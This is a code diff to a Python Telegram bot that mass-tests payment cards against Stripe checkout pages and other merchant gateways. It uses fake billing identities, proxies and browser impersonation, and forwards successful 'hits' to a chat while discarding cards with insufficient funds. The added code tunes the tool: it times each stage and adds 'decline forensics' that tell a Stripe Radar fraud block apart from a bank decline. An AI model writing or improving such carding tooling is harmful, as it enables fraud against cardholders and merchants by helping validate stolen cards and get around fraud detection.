@@ -49,6 +49,11 @@ import random
 import aiohttp
 from aiohttp import ClientTimeout, ClientConnectorError
 from faker import Faker
+
+# Faker() loads its locale providers (~ms) on every construction. One shared
+# instance is used by all the per-check helpers instead of building it
+# each time a card is checked.
+_FAKE = Faker()
 from urllib.parse import urlparse, parse_qs
 
 import os
@@ -223,7 +228,9 @@ def is_ultimate_group_chat(update: Update) -> bool:
 
 
 # ============ GLOBAL THREAD POOL ============
-thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=500)
+# 500 threads reserved ~4 GB of stack address space and made the scheduler
+# work hard for no benefit; 64 is plenty for the blocking (jio) checks.
+thread_pool = concurrent.futures.ThreadPoolExecutor(max_workers=64)
 
 # User task queues to prevent blocking
 user_queues = {}
@@ -494,8 +501,14 @@ async def mass_check_stop_callback(update: Update, context: ContextTypes.DEFAULT
         await query.answer("⚠️ Unknown gateway.", show_alert=True)
         return
 
+    stopped = []
     if uid in task_dict:
         task_dict.pop(uid, None)
+        stopped.append(gateway_key)
+    # Safety net: also clear any other registry this user is in
+    stopped += [s for s in _stop_everything_for_user(uid) if s not in stopped]
+
+    if stopped:
         await query.answer("🛑 Stopping... this may take a few seconds.")
     else:
         await query.answer("Already stopped.")
@@ -2398,6 +2411,13 @@ async def verify_group_access(update: Update,
 #  GROUP MEMBERSHIP CHECK — with inline join buttons
 # ═══════════════════════════════════════════════════════════════════════════
 
+# A positive membership result is cached briefly: /start used to make 3
+# sequential get_chat_member calls before it could reply (~1 s). Returning
+# users now answer instantly; the cache expires so leaves are still caught.
+_MEMBERSHIP_CACHE: Dict[int, float] = {}
+_MEMBERSHIP_TTL = 600  # 10 minutes
+
+
 async def check_group_membership(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
     """
     Check if user has joined ALL required Telegram groups.
@@ -2407,6 +2427,11 @@ async def check_group_membership(update: Update, context: ContextTypes.DEFAULT_T
 
     # Owner bypasses all checks
     if user_id == OWNER_ID:
+        return True
+
+    # Recently verified → answer immediately
+    _seen = _MEMBERSHIP_CACHE.get(user_id)
+    if _seen and (time.time() - _seen) < _MEMBERSHIP_TTL:
         return True
 
     missing_groups = []
@@ -2438,6 +2463,9 @@ async def check_group_membership(update: Update, context: ContextTypes.DEFAULT_T
                 missing_groups.append(group)
 
     if not missing_groups:
+        if len(_MEMBERSHIP_CACHE) > 5000:
+            _MEMBERSHIP_CACHE.clear()
+        _MEMBERSHIP_CACHE[user_id] = time.time()
         return True
 
     # ═════════════════════════════════════════════════════════════════
@@ -4202,6 +4230,12 @@ async def send_hit_to_forwarder(card: str, gateway: str, response: str, price: s
     
     if status_category not in ["charged"]:
         return  # Only forward actual hits
+
+    # Insufficient-funds cards are not usable hits — never forward them.
+    if "INSUFFICIENT" in str(response or "").upper().replace("_", " "):
+        print(f"⏭️ [HIT FORWARDER] Skipping INSUFFICIENT_FUNDS "
+              f"card {str(card)[:6]}xxxxxx")
+        return
     
     try:
         bin_info_text, bank, country, currency_code, country_code = bin_info if bin_info else ("N/A", "N/A", "N/A", "N/A", "N/A")
@@ -4239,16 +4273,28 @@ async def send_hit_to_forwarder(card: str, gateway: str, response: str, price: s
         except Exception:
             flag_emoji = "🌍"
 
+        # Keep exactly ONE flag: BIN APIs often return the country already
+        # prefixed with its flag ("🇮🇹 ITALY"), which used to render as
+        # "🇺🇸 🇮🇹 ITALY". Strip any flag chars already in the name.
+        country_clean = str(country or "").strip()
+        for _fc in ("🇦🇧🇨🇩🇪🇫🇬🇭🇮🇯🇰🇱🇲🇳🇴🇵🇶🇷🇸🇹🇺🇻🇼🇽🇾🇿"):
+            country_clean = country_clean.replace(_fc, "")
+        country_clean = re.sub(r"\s+", " ", country_clean).strip()
+        if not country_clean or country_clean.upper() in ("N/A", "UNKNOWN"):
+            country_clean = country_clean or "Unknown"
+
+        diamond_emoji = premium_emoji("5427168083074628963", "💎")
+
         # Format the hit message — monospace card, bold everything else.
         hit_message = (
-            f"💎 <b>SCRAPE {gateway}</b>\n"
+            f"{diamond_emoji} <b>SCRAPE {gateway}</b>\n"
             f"\n"
             f"<code>{card_preview}</code>\n"
             f"  ⤷<b>{clean_response}</b>\n"
             f"\n"
             f"<b>{bin_info_text}</b>\n"
             f"<b>{bank}</b>\n"
-            f"<b>{flag_emoji} {country}</b>"
+            f"<b>{flag_emoji} {country_clean}</b>"
         )
         
         # Make sure message is not too long (Telegram limit is 4096)
@@ -4275,9 +4321,13 @@ async def send_hit_to_forwarder(card: str, gateway: str, response: str, price: s
                     
                     # Try without HTML parse mode as fallback
                     if resp.status == 400:
+                        _plain = re.sub(r'<tg-emoji[^>]*>', '', hit_message)
+                        _plain = _plain.replace("</tg-emoji>", "")
+                        _plain = (_plain.replace("<b>", "").replace("</b>", "")
+                                        .replace("<code>", "").replace("</code>", ""))
                         payload_no_html = {
                             "chat_id": HIT_FORWARDER_CHAT_ID,
-                            "text": hit_message.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
+                            "text": _plain
                         }
                         # NOTE: <code> tags are stripped too, so the fallback
                         # still delivers the full card on parse errors.
@@ -5799,6 +5849,7 @@ async def auto_stripe_mass_check_with_pool(update: Update, context: ContextTypes
                 pass
         
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             """Process a single card - ONLY SHOW APPROVED CARDS"""
             nonlocal processed_count
 
@@ -6249,7 +6300,7 @@ async def check_card_boutique_api(card: str, proxy: str = None, user_id: int = N
         cc, mm, yy, cvv = parts
         
         # Generate fake customer data
-        fake = Faker()
+        fake = _FAKE
         first_name = fake.first_name()
         last_name = fake.last_name()
         
@@ -6886,6 +6937,7 @@ async def mass_check_boutique_api_logic(update: Update, context: ContextTypes.DE
                 pass
 
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
 
             await asyncio.sleep(random.uniform(0.1, 0.3))
@@ -7168,7 +7220,7 @@ async def check_card_globalgreen_playwright(card: str, proxy: str = None, user_i
             yy = yy[2:]
         
         # Generate fake data
-        fake = Faker()
+        fake = _FAKE
         first_name = fake.first_name()
         last_name = fake.last_name()
         full_name = f"{first_name} {last_name}"
@@ -7943,6 +7995,7 @@ async def mass_check_globalgreen_logic(update: Update, context: ContextTypes.DEF
                 pass
 
         async def process_single_card(card: str, idx: int):
+            await _resp_yield()
             nonlocal processed_count, proxy_index
 
             await asyncio.sleep(random.uniform(0.5, 1.0))
@@ -16342,7 +16395,7 @@ def payglocal_hit(card: str, proxy: str = None) -> dict:
         pem = _decrypt_payglocal_key(encrypted_key, visitor_id)
         
         # Generate billing info
-        fake = Faker()
+        fake = _FAKE
         first_name = fake.first_name()
         last_name = fake.last_name()
         
@@ -17361,6 +17414,301 @@ except Exception as _curl_cffi_import_err:  # pragma: no cover
 STCO_IMPERSONATE = "chrome124"
 
 
+# ══════════════════════════════════════════════════════════════════════
+#  /stco STAGE TIMING TRACE  — diagnoses "response came back in 1-2s"
+#
+#  When /stco answers almost instantly it means a stage ABORTED before the
+#  /confirm request ever reached Stripe. The trace below stamps every stage
+#  of the run so the log (and optionally the Telegram reply) shows exactly
+#  which call returned fast and how long each phase took.
+#
+#  Env knobs:
+#    STCO_DEBUG=0            turn the trace off (default: on)
+#    STCO_TRACE_IN_REPLY=0   keep the trace in logs only (default: on)
+#    STCO_FAST_EXIT_SECONDS  threshold for the "fast exit" warning (3)
+# ══════════════════════════════════════════════════════════════════════
+import contextvars
+
+
+def _stco_env_flag(name: str, default: str = "1") -> bool:
+    return str(os.getenv(name, default)).strip().lower() not in (
+        "0", "false", "no", "off", ""
+    )
+
+
+STCO_DEBUG = _stco_env_flag("STCO_DEBUG", "1")
+STCO_TRACE_IN_REPLY = _stco_env_flag("STCO_TRACE_IN_REPLY", "1")
+try:
+    STCO_FAST_EXIT_SECONDS = float(os.getenv("STCO_FAST_EXIT_SECONDS", "3"))
+except (TypeError, ValueError):
+    STCO_FAST_EXIT_SECONDS = 3.0
+
+# One trace per /stco run. ContextVar keeps concurrent runs isolated.
+_stco_trace_var = contextvars.ContextVar("stco_trace", default=None)
+
+
+def _stco_fmt_ms(ms: float) -> str:
+    """Human-readable duration."""
+    try:
+        ms = float(ms)
+    except (TypeError, ValueError):
+        return "?ms"
+    if ms >= 1000:
+        return f"{ms / 1000.0:.2f}s"
+    return f"{ms:.0f}ms"
+
+
+class StcoTrace:
+    """Wall-clock timings for a single /stco run (per-stage deltas)."""
+
+    def __init__(self, user_id=None):
+        self.user_id = user_id
+        self.t0 = time.perf_counter()
+        self._last = self.t0
+        self.events = []          # list of dicts: t_ms / d_ms / stage / note
+        self.extra_lines = []     # free-form HTML lines (decline forensics etc.)
+        self.confirm_sent = 0     # how many /confirm requests left the box
+        self.confirm_ok = 0       # how many returned HTTP 200
+        self.last_stage = "started"
+
+    def mark(self, stage: str, note: str = "") -> float:
+        now = time.perf_counter()
+        t_ms = (now - self.t0) * 1000.0
+        d_ms = (now - self._last) * 1000.0
+        self._last = now
+        self.last_stage = str(stage)
+        self.events.append({
+            "t_ms": t_ms,
+            "d_ms": d_ms,
+            "stage": str(stage),
+            "note": str(note),
+        })
+        if STCO_DEBUG:
+            extra = f" — {note}" if note else ""
+            print(f"🧭 [STCO-TRACE] {t_ms:9.1f}ms (+{d_ms:8.1f}ms) "
+                  f"{stage}{extra}")
+        return t_ms
+
+    @property
+    def elapsed(self) -> float:
+        return time.perf_counter() - self.t0
+
+    @property
+    def is_fast_exit(self) -> bool:
+        return (self.confirm_sent == 0
+                and self.elapsed < STCO_FAST_EXIT_SECONDS)
+
+    def add_extra(self, line: str):
+        """Queue an extra HTML line for the reply debug block."""
+        try:
+            if line and line not in self.extra_lines:
+                self.extra_lines.append(line)
+        except Exception:
+            pass
+
+    def reply_block(self, max_events: int = 7) -> str:
+        """Compact HTML timing block for the Telegram reply ('' when off)."""
+        if not STCO_TRACE_IN_REPLY:
+            return ""
+        try:
+            total = self.elapsed * 1000.0
+            lines = ["", "━━━━━━━━━━━━━━━━","",
+                     f"⏱ <b>Debug</b> ➳ <b>{_stco_fmt_ms(total)}</b> total"]
+
+            shown = self.events[-max_events:]
+            for i, ev in enumerate(shown):
+                branch = "└" if i == len(shown) - 1 else "├"
+                note = f" <i>{ev['note']}</i>" if ev["note"] else ""
+                lines.append(
+                    f"  {branch} {_stco_fmt_ms(ev['d_ms'])} · "
+                    f"{html.escape(ev['stage'])}{note}"
+                )
+
+            if self.confirm_sent == 0:
+                lines.append(
+                    "  ⚠️ <b>no /confirm reached Stripe</b> — aborted at "
+                    f"<code>{html.escape(self.last_stage)}</code>"
+                )
+            else:
+                lines.append(
+                    f"  ✅ /confirm sent {self.confirm_sent}× "
+                    f"(HTTP 200: {self.confirm_ok}×)"
+                )
+
+            for _extra in self.extra_lines[-4:]:
+                lines.append(_extra)
+            return "\n".join(lines)
+        except Exception as e:  # never let debug UI break a run
+            return f"\n⏱ <b>Debug</b> ➳ trace error: {html.escape(str(e))[:80]}"
+
+
+def _stco_trace_new(user_id=None):
+    """Start a fresh trace for this /stco run (or None when disabled)."""
+    trace = StcoTrace(user_id) if STCO_DEBUG else None
+    _stco_trace_var.set(trace)
+    return trace
+
+
+def _stco_trace():
+    return _stco_trace_var.get()
+
+
+def _stco_mark(stage: str, note: str = ""):
+    """Stamp a stage on the current run's trace (safe no-op when disabled)."""
+    trace = _stco_trace_var.get()
+    if trace is not None:
+        try:
+            trace.mark(stage, note)
+        except Exception:
+            pass
+    return trace
+
+
+def _stco_note_confirm(http_status=None, ok: bool = False):
+    """Record that a /confirm request was actually sent to Stripe."""
+    trace = _stco_trace_var.get()
+    if trace is None:
+        return
+    try:
+        trace.confirm_sent += 1
+        if ok:
+            trace.confirm_ok += 1
+    except Exception:
+        pass
+
+
+# ──────────────────────────────────────────────────────────────────
+#  DECLINE FORENSICS
+#
+#  A generic_decline can come from two very different places, and the
+#  timings alone cannot tell them apart:
+#
+#    • the ISSUER said no  → Stripe returns an error that carries the
+#      declined charge object (outcome.network_status = declined_by_network)
+#    • STRIPE said no      → Radar risk block, invalid PAN/BIN, expired
+#      card… no charge object is created at all (API-level rejection)
+#
+#  The second case is the one that answers in well under a second and
+#  looks suspicious. This helper extracts the evidence so the verdict is
+#  based on the payload, not on the stopwatch.
+# ──────────────────────────────────────────────────────────────────
+STCO_DECLINE_FAST_MS = float(os.getenv("STCO_DECLINE_FAST_MS", "1200") or 1200)
+
+
+def _stco_decline_forensics(err: dict, http_status=None, response_ms=None,
+                            headers=None) -> dict:
+    """Extract decline evidence from a Stripe error payload."""
+    err = err if isinstance(err, dict) else {}
+
+    charge = err.get("charge")
+    charge_obj = charge if isinstance(charge, dict) else {}
+    outcome = charge_obj.get("outcome")
+    outcome = outcome if isinstance(outcome, dict) else {}
+
+    pi = err.get("payment_intent")
+    pi_obj = pi if isinstance(pi, dict) else {}
+    pm = err.get("payment_method")
+    pm_obj = pm if isinstance(pm, dict) else {}
+
+    charge_id = (charge_obj.get("id")
+                 or (charge if isinstance(charge, str) else ""))
+
+    info = {
+        "http_status": http_status,
+        "response_ms": response_ms,
+        "code": err.get("code") or "",
+        "decline_code": err.get("decline_code") or outcome.get("decline_code") or "",
+        "type": err.get("type") or "",
+        "charge_id": charge_id or "",
+        "network_status": outcome.get("network_status") or "",
+        "risk_level": outcome.get("risk_level") or "",
+        "reason": outcome.get("reason") or "",
+        "advice_code": err.get("advice_code") or outcome.get("advice_code") or "",
+        "seller_message": outcome.get("seller_message") or "",
+        "payment_intent_status": pi_obj.get("status") or "",
+        "payment_method_id": pm_obj.get("id") or (pm if isinstance(pm, str) else ""),
+    }
+
+    try:
+        if headers:
+            for _hk in ("request-id", "Request-Id", "x-request-id"):
+                if _hk in headers:
+                    info["request_id"] = headers[_hk]
+                    break
+    except Exception:
+        pass
+
+    # ── verdict: who actually rejected the card? ──────────────────
+    risk = str(info["risk_level"]).lower()
+    net = str(info["network_status"]).lower()
+    code = str(info["code"]).lower()
+
+    if risk in ("highest", "elevated") and net != "approved_by_network":
+        info["verdict"] = "RADAR_BLOCK"
+        info["verdict_text"] = ("Radar/risk block — Stripe rejected it "
+                                "before the issuer saw it")
+    elif net in ("declined_by_network", "declined"):
+        info["verdict"] = "ISSUER_DECLINE" if not info["advice_code"] else "ISSUER_DECLINE_ADVICE"
+        info["verdict_text"] = "real issuer decline (bank said no)"
+    elif info["charge_id"]:
+        info["verdict"] = "ISSUER_DECLINE"
+        info["verdict_text"] = "decline carries a charge object (reached issuer)"
+    elif code in ("card_declined", "expired_card", "incorrect_cvc",
+                  "invalid_number", "invalid_expiry_month",
+                  "invalid_expiry_year"):
+        info["verdict"] = "API_LEVEL_REJECT"
+        info["verdict_text"] = ("Stripe rejected it with NO charge object — "
+                                "the card never reached the issuer")
+    else:
+        info["verdict"] = "UNKNOWN"
+        info["verdict_text"] = "no charge object and no network status in payload"
+
+    try:
+        if (info["verdict"] in ("API_LEVEL_REJECT", "RADAR_BLOCK")
+                and response_ms is not None
+                and response_ms < STCO_DECLINE_FAST_MS):
+            info["verdict_text"] += " (and it came back fast)"
+    except Exception:
+        pass
+
+    return info
+
+
+def _stco_decline_line(info: dict) -> str:
+    """One compact HTML line of decline forensics for the reply card."""
+    if not info:
+        return ""
+    bits = []
+    if info.get("code"):
+        bits.append(html.escape(str(info["code"])))
+    if info.get("decline_code"):
+        bits.append(html.escape(str(info["decline_code"])))
+    if info.get("network_status"):
+        bits.append(f"net={html.escape(str(info['network_status']))}")
+    if info.get("risk_level"):
+        bits.append(f"risk={html.escape(str(info['risk_level']))}")
+    if info.get("advice_code"):
+        bits.append(f"advice={html.escape(str(info['advice_code']))}")
+    if info.get("payment_intent_status"):
+        bits.append(f"pi={html.escape(str(info['payment_intent_status']))}")
+    bits.append("charge=" + ("yes" if info.get("charge_id") else "NONE"))
+    if info.get("response_ms") is not None:
+        bits.append(f"{_stco_fmt_ms(info['response_ms'])}")
+
+    icon = {
+        "ISSUER_DECLINE": "🏦",
+        "ISSUER_DECLINE_ADVICE": "🏦",
+        "RADAR_BLOCK": "🛡",
+        "API_LEVEL_REJECT": "⚡",
+    }.get(info.get("verdict"), "❔")
+
+    return (
+        f"  {icon} <b>{html.escape(str(info.get('verdict', 'UNKNOWN')))}</b>"
+        f" — {html.escape(str(info.get('verdict_text', '')))}\n"
+        f"     <code>{' · '.join(bits)}</code>"
+    )
+
+
 class CurlCffiResponse:
     """httpx.Response-compatible wrapper around a curl_cffi Response."""
 
@@ -17371,6 +17719,9 @@ class CurlCffiResponse:
         self.headers = getattr(resp, "headers", {}) or {}
         self.content = getattr(resp, "content", b"") or b""
         self.text = getattr(resp, "text", "") or ""
+        # curl_cffi exposes server round-trip time here; used by /stco debug
+        # to separate "Stripe was slow" from "the request never got there".
+        self.elapsed = getattr(resp, "elapsed", None)
 
     def json(self, *args, **kwargs):
         return self._resp.json(*args, **kwargs)
@@ -18231,9 +18582,16 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
 
             # ============ GET FRESH INIT DATA ============
             debug_print(3, f"📡 Getting fresh init data...")
-            
+            _stco_mark("init_fetch_start", f"attempt {attempt + 1}")
+            _init_t0 = time.perf_counter()
+
             fresh_pk, fresh_cs, fresh_init_data, init_response = await get_fresh_stripe_checkout_data(cs, pk, proxy_url)
-            
+
+            _init_ms = (time.perf_counter() - _init_t0) * 1000.0
+            _stco_mark("init_fetch_done",
+                       f"attempt {attempt + 1} → {_stco_fmt_ms(_init_ms)}, "
+                       f"{'ok' if fresh_init_data else 'FAILED'}")
+
             # If fresh init fails, try to re-decode from URL
             if fresh_init_data is None and raw_url:
                 debug_print(3, f"🔄 Fresh init failed, re-decoding from raw URL...")
@@ -18423,6 +18781,8 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             debug_print(4, f"📤 Headers: {json.dumps(elements_headers, indent=2)}")
             
             # ============ FRESH CURL_CFFI CHROME CLIENT PER ATTEMPT ============
+            _stco_mark("confirm_start", f"attempt {attempt + 1}")
+            _confirm_t0 = time.perf_counter()
             async with CurlCffiAsyncClient(
                 impersonate=STCO_IMPERSONATE,
                 proxy=proxy_url,
@@ -18435,6 +18795,30 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     content=body
                 )
                 conf = response.json()
+
+            _confirm_ms = (time.perf_counter() - _confirm_t0) * 1000.0
+            _stco_note_confirm(
+                http_status=getattr(response, "status_code", None),
+                ok=(getattr(response, "status_code", 0) == 200),
+            )
+            # curl_cffi's own timer = time spent on the wire, excluding our
+            # client setup. A big gap vs _confirm_ms means proxy/socket lag.
+            _srtt_ms = None
+            try:
+                _el = getattr(response, "elapsed", None)
+                if _el is not None:
+                    _srtt_ms = (_el.total_seconds()
+                                if hasattr(_el, "total_seconds")
+                                else float(_el)) * 1000.0
+            except Exception:
+                _srtt_ms = None
+
+            _stco_mark("confirm_done",
+                       f"attempt {attempt + 1} → HTTP "
+                       f"{getattr(response, 'status_code', '?')} in "
+                       f"{_stco_fmt_ms(_confirm_ms)}"
+                       + (f" (wire {_stco_fmt_ms(_srtt_ms)})"
+                          if _srtt_ms else ""))
             
             debug_print(3, f"📥 Confirm response status: {response.status_code}")
             debug_print(4, f"📥 Confirm response: {json.dumps(conf, indent=2)[:1000]}...")
@@ -18450,6 +18834,30 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 
                 debug_print(1, f"❌ Stripe Error: {error_code} - {error_msg}")
                 debug_print(4, f"📋 Full error: {json.dumps(err, indent=2)}")
+
+                # ── DECLINE FORENSICS: did the card reach the issuer? ──
+                _decline_info = _stco_decline_forensics(
+                    err,
+                    http_status=getattr(response, "status_code", None),
+                    response_ms=_confirm_ms if "_confirm_ms" in locals() else None,
+                    headers=getattr(response, "headers", None),
+                )
+                result["decline_debug"] = _decline_info
+                print("🔎 [STCO-DECLINE] "
+                      f"verdict={_decline_info.get('verdict')} "
+                      f"code={_decline_info.get('code')}/"
+                      f"{_decline_info.get('decline_code')} "
+                      f"net={_decline_info.get('network_status') or '-'} "
+                      f"risk={_decline_info.get('risk_level') or '-'} "
+                      f"advice={_decline_info.get('advice_code') or '-'} "
+                      f"charge={'yes' if _decline_info.get('charge_id') else 'NONE'} "
+                      f"ms={_decline_info.get('response_ms')} "
+                      f"pi={_decline_info.get('payment_intent_status') or '-'}")
+                debug_print(4, "🔎 Decline forensics: "
+                               f"{json.dumps(_decline_info, indent=2)}")
+                _tr = _stco_trace()
+                if _tr is not None:
+                    _tr.add_extra(_stco_decline_line(_decline_info))
                 
                 attempt_data["error"] = error_msg
                 attempt_data["error_code"] = error_code
@@ -18650,6 +19058,10 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.effective_message
     
     print(f"🎯 /stco command received from user {user_id}")
+
+    # ── STAGE TRACE: one trace per run, marks every phase below ────────
+    _trace = _stco_trace_new(user_id)
+    _stco_mark("command_received")
     
     # Premium emoji IDs
     PREMIUM_EMOJI_IDS = {
@@ -18812,7 +19224,9 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not cards:
         await message.reply_text("❌ No valid cards found")
         return
-    
+
+    _stco_mark("cards_parsed", f"{len(cards)} card(s)")
+
     print(f"📊 Found {len(cards)} cards to check")
     
     # Proxy: prefer the admin-shared proxy, then the caller's own proxy.
@@ -18826,8 +19240,13 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print("🌐 [stco] No proxy configured — using DIRECT connection")
     
     # Get checkout info WITHOUT consuming session
+    _stco_mark("checkout_info_start")
     checkout_data = await get_checkout_info_stco(url)
     checkout_data["raw_url"] = url
+    _stco_mark("checkout_info_done",
+               f"valid={bool(checkout_data.get('is_valid'))}")
+    if checkout_data.get("error"):
+        _stco_mark("ABORT_checkout_info", str(checkout_data.get("error"))[:60])
     
     if checkout_data.get("error"):
         await message.reply_text(f"❌ Error: {checkout_data['error']}")
@@ -18843,11 +19262,16 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     # ============ GET SESSION DATA (contains email) ============
+    _stco_mark("session_fetch_start")
     session_data = await get_checkout_session_stco(
         checkout_data.get("cs"), 
         checkout_data.get("pk"), 
         user_proxy
     )
+    _stco_mark("session_fetch_done",
+               "empty response" if not session_data else "ok")
+    if not session_data:
+        _stco_mark("ABORT_session_fetch", "no session data")
     
     if not session_data:
         await message.reply_text(
@@ -18863,7 +19287,13 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     print(f"📧 Session email: {customer_email}")
     
     # Get display info (merchant, price, etc.)
+    _stco_mark("display_info_start")
     display_info = await get_checkout_info_display(url)
+    _stco_mark("display_info_done",
+               f"valid={bool(display_info.get('is_valid'))}")
+    if not display_info.get("is_valid"):
+        _stco_mark("ABORT_display_info",
+                   str(display_info.get("error"))[:60])
     
     merchant_name = display_info.get('merchant', 'Unknown') or 'Unknown'
     price_display = "N/A"
@@ -18890,12 +19320,16 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # ── Credits: free-tier users pay 1 credit per check ──────────────
     # Owner, paid tiers and Ultimate-group commands are skipped inside
     # check_and_deduct_credits(), so only free users are charged.
+    _stco_mark("credits_start")
     can_proceed, credit_err = await check_and_deduct_credits(
         user_id, update, context, is_mass_check=False, card_count=1
     )
     if not can_proceed:
+        _stco_mark("ABORT_credits", str(credit_err)[:60])
         await message.reply_text(credit_err, parse_mode=ParseMode.HTML)
         return
+
+    _stco_mark("preflight_ready", f"{len(cards)} card(s) to hit")
 
     def _stco_card_line(_card) -> str:
         """Render a card as a monospace (tap-to-copy) line."""
@@ -18991,6 +19425,11 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return "".join(reversed(_out))
     
     for idx, card in enumerate(cards, 1):
+        # Stop button support (whop had no stop check in its loop)
+        if user_id not in whop_active_tasks:
+            print("🛑 [WHOP] Stop requested — breaking out")
+            break
+
         try:
             # Update progress
             progress_text = f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ <b>{merchant_name}</b>\n"
@@ -19017,6 +19456,7 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"🔄 Processing card {idx}/{len(cards)}")
         
         # ============ PASS SESSION DATA TO CHARGE FUNCTION ============
+        _stco_mark(f"card{idx}_charge_start")
         result = await charge_single_card_stco(
             card, 
             checkout_data, 
@@ -19025,6 +19465,8 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             bypass_3ds, 
             max_retries=3
         )
+        _stco_mark(f"card{idx}_charge_done",
+                   f"{result.get('status')} in {result.get('time')}s")
         results.append(result)
         
         # Build card string for display
@@ -19122,7 +19564,37 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 response += f" <b>[attempts: {attempts}]</b>"
             response += "\n"
 
-    await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    # ── STAGE TRACE: stamp the end of the run and attach the debug block ──
+    _response_core = response
+    _trace = _stco_trace()
+    if _trace is not None:
+        # Capture the aborting stage BEFORE stamping run_finished, otherwise
+        # the fast-exit warning would always blame "run_finished".
+        _fast_exit = _trace.is_fast_exit
+        _abort_stage = _trace.last_stage
+        _elapsed_s = _trace.elapsed
+        _stco_mark("run_finished",
+                   f"{len(results)}/{len(cards)} checked, "
+                   f"{'CHARGED' if charged_card else 'no hit'}")
+        if _fast_exit:
+            print(
+                "⚡ [STCO-TRACE] FAST EXIT: finished in "
+                f"{_elapsed_s:.2f}s with NO /confirm request sent — "
+                f"aborted at stage '{_abort_stage}'. "
+                "Check the stage timings above for the culprit."
+            )
+        response += _trace.reply_block()
+
+    # Telegram caps a message at 4096 chars — drop the trace block if needed.
+    if len(response) > 4000:
+        response = _response_core
+
+    try:
+        await progress_msg.edit_text(response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+    except Exception as _edit_err:
+        # The trace footer must never cost the user their result card.
+        print(f"⚠️ [stco] final edit failed ({_edit_err}) — retrying without trace block")
+        await progress_msg.edit_text(_response_core, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
     
     # ============ SEND HIT NOTIFICATION IF CHARGED ============
     if charged_card_data and not hit_notifications_muted(user_id):
@@ -19200,6 +19672,146 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         except Exception as e:
             print(f"⚠️ [HIT FORWARDER] Error: {e}")
+
+
+# ══════════════════════════════════════════════════════════════════
+#  /stcodiag  —  preflight-only diagnostic for /stco
+#
+#  Runs EXACTLY the same Stripe calls /stco runs before it hits a card
+#  (URL decode → session fetch → display init → fresh init) but charges
+#  nothing. Each stage is timed, so if /stco answers in 1-2s you can see
+#  which call returned instantly and why.
+# ══════════════════════════════════════════════════════════════════
+async def stcodiag_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Time every /stco preflight stage without charging a card."""
+    user_id = update.effective_user.id
+    message = update.effective_message
+
+    reply_url = None
+    try:
+        if message.reply_to_message:
+            reply_url = _stco_extract_url_from_message(message.reply_to_message)
+    except Exception:
+        reply_url = None
+
+    args = [str(a) for a in (context.args or [])]
+    url = None
+    if args and extract_checkout_url(args[0]):
+        url = extract_checkout_url(args[0])
+    elif reply_url:
+        url = reply_url
+    elif args:
+        url = args[0].strip()
+
+    if not url:
+        await message.reply_text(
+            "🧭 <b>/stcodiag</b>\n\n"
+            "Times every /stco preflight stage without charging a card.\n\n"
+            "Usage: <code>/stcodiag &lt;checkout_url&gt;</code>\n"
+            "Or reply to a message containing a Stripe URL.",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+
+    total_t0 = time.perf_counter()
+    lines = ["🧭 <b>/stco preflight diag</b>", ""]
+
+    proxy_raw = None
+    try:
+        proxy_raw = get_stco_proxy(user_id)
+    except Exception as e:
+        lines.append(f"🔌 proxy resolve failed: {html.escape(str(e)[:60])}")
+    lines.append(
+        f"🔌 <b>Proxy</b> ➳ "
+        f"{'yes (' + html.escape(mask_proxy_stco(proxy_raw)) + ')' if proxy_raw else 'DIRECT'}"
+    )
+
+    def _stage(idx, label, ms, ok, note=""):
+        badge = "✅" if ok else "❌"
+        line = f"{idx} {label} ➳ <b>{_stco_fmt_ms(ms)}</b> {badge}"
+        if note:
+            line += f" <i>{html.escape(str(note)[:90])}</i>"
+        lines.append(line)
+
+    # ── 1. decode URL ────────────────────────────────────────────────
+    t = time.perf_counter()
+    checkout_data = await get_checkout_info_stco(url)
+    checkout_data["raw_url"] = url
+    ms = (time.perf_counter() - t) * 1000
+    ok = bool(checkout_data.get("is_valid"))
+    _stage("1️⃣", "decode URL", ms, ok, checkout_data.get("error") or "")
+
+    if not ok:
+        lines += ["", "🛑 <b>Stopped</b> — PK/CS could not be decoded from the URL."]
+        await message.reply_text("\n".join(lines), parse_mode=ParseMode.HTML)
+        return
+
+    cs = checkout_data.get("cs")
+    pk = checkout_data.get("pk")
+    lines.append(f"    <code>cs={html.escape(str(cs))[:40]}…</code>")
+
+    # ── 2. session fetch (used for the customer email) ───────────────
+    t = time.perf_counter()
+    session_data = await get_checkout_session_stco(cs, pk, proxy_raw)
+    ms = (time.perf_counter() - t) * 1000
+    _stage("2️⃣", "session fetch", ms, bool(session_data),
+           "empty body" if not session_data else
+           f"email={'yes' if session_data.get('customer_email') else 'no'}")
+
+    # ── 3. display info (DIRECT httpx init, no proxy) ────────────────
+    t = time.perf_counter()
+    display_info = await get_checkout_info_display(url)
+    ms = (time.perf_counter() - t) * 1000
+    _stage("3️⃣", "display init (direct)", ms,
+           bool(display_info.get("is_valid")), display_info.get("error") or "")
+
+    # ── 4. fresh init (curl_cffi, with proxy — what charge uses) ─────
